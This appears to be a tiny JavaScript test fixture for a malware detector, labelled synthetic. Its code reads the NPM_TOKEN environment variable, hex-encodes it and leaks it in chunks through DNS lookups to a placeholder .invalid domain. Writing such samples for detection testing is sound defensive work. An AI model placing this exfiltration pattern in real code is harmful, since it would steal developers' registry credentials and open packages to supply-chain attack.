// FIXTURE ONLY - synthetic detection test sample, not real malware
// Shape: a registry token from the environment, hex-encoded and resolved chunk by chunk
// as DNS labels under a zone. Zone is a non-existent .invalid domain.
const dns = require("dns");
const t = Buffer.from(process.env.NPM_TOKEN || "").toString("hex");
for (let i = 0; i < t.length; i += 60) dns.resolve(`${t.slice(i, i + 60)}.${i}.t.example.invalid`, () => {});
